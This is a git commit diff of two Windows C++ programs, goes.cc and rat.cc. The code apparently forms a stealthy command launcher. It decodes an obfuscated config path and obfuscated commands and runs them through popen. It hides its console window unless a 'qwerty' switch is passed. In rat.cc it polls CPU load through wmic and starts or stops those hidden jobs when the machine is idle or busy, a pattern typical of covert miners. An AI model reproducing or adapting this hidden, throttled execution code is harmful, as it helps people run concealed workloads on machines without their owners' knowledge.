98859bd21e9e0658363797de4380abb1a01500a1
andrewingor <andrewingor@gmail.com>
2017-07-24 17:08:12 +0300

    Backup

--- goes.cc
+++ goes.cc
@@ -5,14 +5,6 @@
 #include <sstream>
 #include <vector>
 
-//#include <memory>
-//#include <future>
-//#include <mutex>
-#include <thread>
-//#include <chrono>
-//#include <condition_variable>
-//#include <deque>
-
 #include <windows.h>
 
 #include "xstr.hpp"
@@ -20,97 +12,7 @@
 using namespace std;
 
 FILE* pipe = NULL;
-
-int CPU = 0;
-int IdleTime = 0;
-int BusyTime = 0;
-
-int thr;
-
-bool show_cpu = true;
 bool cons = false;
-
-vector<hide::line> Run;
-
-#define TIMEOUT 10
-#define DEADLINE  3
-#define    THRMAX 3
-
-/*
- * ==================
- */
-void CALLBACK CPUsage ( HWND wnd , UINT uMsg , UINT Id , DWORD dwTime) { 
-static string percent;
-static char buff[16];
-FILE* wmic = popen("wmic cpu get loadpercentage", "r"); 
-if(!wmic)
-    throw runtime_error("wmic fail");
-
-while( fgets(buff, sizeof(buff), wmic)!=NULL) {
-    percent = buff;
-    if ( isdigit( *percent.begin()) ) break;
-}
-pclose(wmic);
-istringstream sper(percent);
-sper >> CPU;
-if (show_cpu) cout << CPU << endl;
-if ((100 - CPU) > 25) {
-   ++IdleTime;  
-
-cout << "IDLE: " << IdleTime << endl;
-
-}
-else IdleTime = 0;
-
-if ((100 - CPU) < 20) {
-   ++BusyTime;  
-
-cout << "BUSY: " << BusyTime << endl;
-
-}
-else BusyTime = 0;
-
-if (IdleTime == TIMEOUT) {
-    IdleTime = 0;
-    if(pipe) ::pclose(pipe);
-
-    thr = (thr == THRMAX) ? thr : ++thr; 
-
-cout << Run[thr].c_str() << endl;
-
-    pipe = ::popen( Run[thr].c_str(), "r"); 
-    if(!pipe)
-        throw runtime_error(Run[thr] + ": popen fail");
-} else 
-    if (BusyTime == DEADLINE) {
-        BusyTime = 0;
-       if(pipe) ::pclose(pipe);
-
-    thr = (thr == 0) ? thr : --thr; 
-    if (thr) {
-
-cout << Run[thr].c_str() << endl;
-
-    pipe = ::popen( Run[thr].c_str(), "r"); 
-        if(!pipe)
-            throw runtime_error(Run[thr] + ": popen fail");
-   } else { cout << "Just wait" << endl; }
-   }
-
-}
-
-/*
- * ==================
- */
-void Timer (void) {
-::SetTimer (NULL, 0, 3000, (TIMERPROC) &CPUsage);
-
-static MSG msg;
-while( ::GetMessage(&msg, NULL, 0, 0)) {
-    ::TranslateMessage(&msg);
-    ::DispatchMessage(&msg);
-}
-}
 
 /*
  * ======= M A I N =======================
@@ -124,9 +26,9 @@ if (argc > 1) {
     if (arg == "qwerty") cons = true;
 }
 
-//if (!cons) ShowWindow( GetConsoleWindow(), SW_HIDE );
+if (!cons) ShowWindow( GetConsoleWindow(), SW_HIDE );
 
-static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh");
+static hide::line name("");
     name.decode();
     if (cons) cout << name << endl;
     ifstream  ini( name.c_str(), ios::in); 
@@ -134,41 +36,24 @@ static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh
         throw runtime_error(name + ": file not open");
 
 static hide::line arg, Args;
-
-Run.push_back("echo ");
-
 while ( getline(ini, arg)) {
-    if ( *(arg.begin()) == '#') {
-        Args.append(" 2>&1");
-        Run.push_back(Args);
-        Args.clear();
-        continue;
-    }
     arg.decode();
-    if (cons)
-            cout << arg << endl;
+    if (cons) cout << arg << endl;
     Args.append(arg);
 }
 
+Args.append(" 2>&1");
 if (cons)
     throw runtime_error("^^^ eof");
-if ( !Run.size())
-    throw runtime_error("never mind");
 
+pipe = ::popen( Args.c_str(), "r");
+if (!pipe) throw runtime_error("");
 
-thread th1(Timer);
-th1.detach();
+::sleep(30);
 
-static string console;
-while ( getline (cin, console)) {
-cout << console << " what?!" << endl;
-}
-
-if(pipe) pclose(pipe);
 return 0;
-
 } catch (const exception& e) {
     cerr << e.what() << endl;
-if(pipe) pclose(pipe);
-return 1;
+    if(pipe) pclose(pipe);
+    return 1;
 }}
--- rat.cc
+++ rat.cc
@@ -1,8 +1,17 @@
 #include <iostream>
 #include <string>
-#include <sstream>
 #include <stdexcept>
 #include <fstream>
+#include <sstream>
+#include <vector>
+
+//#include <memory>
+//#include <future>
+//#include <mutex>
+#include <thread>
+//#include <chrono>
+//#include <condition_variable>
+//#include <deque>
 
 #include <windows.h>
 
@@ -10,120 +19,163 @@
 
 using namespace std;
 
-const int& CPUsage (void);
+FILE* pipe = NULL;
+
+int CPU = 0;
+int IdleTime = 0;
+int BusyTime = 0;
+
+int thr;
+
+bool show_cpu = true;
+bool cons = false;
+
+vector<hide::line> Run;
+
+#define TIMEOUT 10
+#define DEADLINE  3
+#define    THRMAX 3
 
 /*
+ * ==================
  */
-BOOL WINAPI CTRL_C (DWORD sig) {
-if (sig == CTRL_C_EVENT)
-    throw runtime_error("OK, stop it");
-return TRUE;
+void CALLBACK CPUsage ( HWND wnd , UINT uMsg , UINT Id , DWORD dwTime) { 
+static string percent;
+static char buff[16];
+FILE* wmic = popen("wmic cpu get loadpercentage", "r"); 
+if(!wmic)
+    throw runtime_error("wmic fail");
+
+while( fgets(buff, sizeof(buff), wmic)!=NULL) {
+    percent = buff;
+    if ( isdigit( *percent.begin()) ) break;
+}
+pclose(wmic);
+istringstream sper(percent);
+sper >> CPU;
+if (show_cpu) cout << CPU << endl;
+if ((100 - CPU) > 25) {
+   ++IdleTime;  
+
+cout << "IDLE: " << IdleTime << endl;
+
+}
+else IdleTime = 0;
+
+if ((100 - CPU) < 20) {
+   ++BusyTime;  
+
+cout << "BUSY: " << BusyTime << endl;
+
+}
+else BusyTime = 0;
+
+if (IdleTime == TIMEOUT) {
+    IdleTime = 0;
+    if(pipe) {
+        cout << "CLOSE PIPE, STOP JOB" << endl;
+        ::pclose(pipe);
+        pipe = 0;
+    }
+    thr = (thr == THRMAX) ? thr : ++thr; 
+
+cout << Run[thr].c_str() << endl;
+
+    pipe = ::popen( Run[thr].c_str(), "r"); 
+    if(!pipe)
+        throw runtime_error(Run[thr] + ": popen fail");
+} else 
+    if (BusyTime == DEADLINE) {
+        BusyTime = 0;
+       if(pipe) { 
+            cout << "CLOSE PIPE, STOP JOB" << endl;
+           ::pclose(pipe);
+           pipe = 0;
+       }
+
+    thr = (thr == 0) ? thr : --thr; 
+    if (thr) {
+
+cout << Run[thr].c_str() << endl;
+
+    pipe = ::popen( Run[thr].c_str(), "r"); 
+        if(!pipe)
+            throw runtime_error(Run[thr] + ": popen fail");
+   } else { cout << "Just wait" << endl; }
+   }
+
 }
 
 /*
+ * ==================
+ */
+void Timer (void) {
+::SetTimer (NULL, 0, 3000, (TIMERPROC) &CPUsage);
+
+static MSG msg;
+while( ::GetMessage(&msg, NULL, 0, 0)) {
+    ::TranslateMessage(&msg);
+    ::DispatchMessage(&msg);
+}
+}
+
+/*
+ * ======= M A I N =======================
  */
 int main (int argc, char** argv
 ) {
-static  STARTUPINFO si;
-static  PROCESS_INFORMATION pi;
-static  SYSTEM_INFO sysinfo;
 try {
 
-SetConsoleCtrlHandler(CTRL_C, TRUE);
+if (argc > 1) {
+    string arg(argv[1]);
+    if (arg == "qwerty") cons = true;
+}
 
-static bool cfg = false;
-    if (argc > 1) {
-        string arg(argv[1]);
-        if (arg == "qwerty") cfg = true;
-    }
+//if (!cons) ShowWindow( GetConsoleWindow(), SW_HIDE );
 
-//    if (!cfg) ShowWindow( GetConsoleWindow(), SW_HIDE );
-
-static hide::line name("0xod03RjfkAFpNZFPfN4BfFJLa1UeUV/BaD+djy8TSb5kGQ=");
+static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh");
     name.decode();
-    if (cfg) cout << name << endl;
+    if (cons) cout << name << endl;
     ifstream  ini( name.c_str(), ios::in); 
-    if ( !ini.is_open()) throw runtime_error("file not open");
+    if ( !ini.is_open())
+        throw runtime_error(name + ": file not open");
 
-static hide::line arg, cmd;
+static hide::line arg, Args;
+
+Run.push_back("echo ");
+
 while ( getline(ini, arg)) {
+    if ( *(arg.begin()) == '#') {
+        Args.append(" 2>&1");
+        Run.push_back(Args);
+        Args.clear();
+        continue;
+    }
     arg.decode();
-    if (cfg) cout << arg << endl;
-    else
-        cmd.append(arg);
-}
-if (cfg) throw runtime_error("<<<<<<<<<< eof >>>>>>>>>>>>");
-
-/*
-GetSystemInfo(&sysinfo);
-DWORD num = sysinfo.dwNumberOfProcessors;
-cout << "CPU:" << num << endl;
-throw runtime_error("---");
-*/
-while (1) { 
-    cout << CPUsage() << endl;
-    sleep(1);
+    if (cons)
+            cout << arg << endl;
+    Args.append(arg);
 }
 
-static char buff[1024];
+if (cons)
+    throw runtime_error("^^^ eof");
+if ( !Run.size())
+    throw runtime_error("never mind");
 
-FILE* game = popen(cmd.c_str(), "r"); 
-if(!game)
-    throw runtime_error("Game not popen");
 
-while( fgets(buff, sizeof(buff), game)!=NULL) {
-    cout << buff << endl;
+thread th1(Timer);
+th1.detach();
+
+static string console;
+while ( getline (cin, console)) {
+cout << console << " what?!" << endl;
 }
-pclose(game);
-/*
-    ZeroMemory( &si, sizeof(si) );
-    si.cb = sizeof(si);
-//  si.dwFlags = STARTF_USESHOWWINDOW;
-//  si.wShowWindow = SW_HIDE;
-    ZeroMemory( &pi, sizeof(pi) );
 
-    if( !CreateProcess ( NULL,   // No module name (use command line)
-        (LPSTR)cmd.c_str(),  // Command line
-        NULL,           // Process handle not inheritable
-        NULL,           // Thread handle not inheritable
-        FALSE,          // Set handle inheritance to FALSE
-        CREATE_NO_WINDOW,  
-        NULL,           // Use parent's environment block
-        NULL,           // Use parent's starting directory 
-        &si,            // Pointer to STARTUPINFO structure
-        &pi)           // Pointer to PROCESS_INFORMATION structure
-    )
-     throw new runtime_error("create process fail");
+if(pipe) pclose(pipe);
+return 0;
 
- //   WaitForSingleObject( pi.hProcess, INFINITE );
-
-    CloseHandle( pi.hProcess );
-    CloseHandle( pi.hThread );
-*/
-    return 0;
 } catch (const exception& e) {
     cerr << e.what() << endl;
-    return 1;
+if(pipe) pclose(pipe);
+return 1;
 }}
-
-/*
- *
- */
-const int& CPUsage (void)
-{
-static string percent;
-static char buff[16];
-FILE* pipe = popen("wmic cpu get loadpercentage", "r"); 
-if(!pipe)
-    throw runtime_error("wmic fail");
-while( fgets(buff, sizeof(buff), pipe)!=NULL) {
-    percent = buff;
-if ( isdigit( *percent.begin()) )
-    break;
-}
-pclose(pipe);
-
-static int per;
-istringstream sper(percent); sper >> per;
-return per;
-}
